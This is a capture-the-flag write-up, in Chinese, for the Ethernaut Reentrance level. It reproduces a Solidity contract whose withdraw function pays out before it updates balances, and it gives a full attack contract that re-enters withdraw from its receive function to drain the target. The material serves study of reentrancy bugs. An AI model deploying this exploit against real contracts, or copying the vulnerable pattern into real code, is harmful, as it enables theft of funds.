# Ethernaut CTF Writeup

## Level 10

> 題目: https://ethernaut.openzeppelin.com/level/0x465f1E2c7FFDe5452CFe92aC3aa1230B76B2B1CB

原始碼: 

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

過關條件: 

- 偷走合約的所有資產

解法：

- 問題在於 `withdraw` 函數在更新餘額前就將錢送出，攻擊者可以在餘額結算前再次呼叫 `withdraw`，領出更多錢

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract ReentranceAttack {
    Reentrance public target;  // 目標合約地址
    uint public amount = 0.001 ether;

    constructor(address payable _targetAddress) public {
        target = Reentrance(_targetAddress);
    }

    // 攻擊，先捐贈資金以建立餘額
    function attack() external payable {
        require(msg.value >= amount, "Not enough Ether to attack");

        // 捐贈資金以建立餘額
        target.donate{value: amount}(address(this));

        // 開始調用 withdraw，觸發重入漏洞
        target.withdraw(amount);
    }

    // 當資金被退回時，會調用此函数
    receive() external payable {
        if (address(target).balance > 0) {
            // 再次調用 withdraw 函数，實現遞迴攻擊
            target.withdraw(amount);
        }
    }
}
```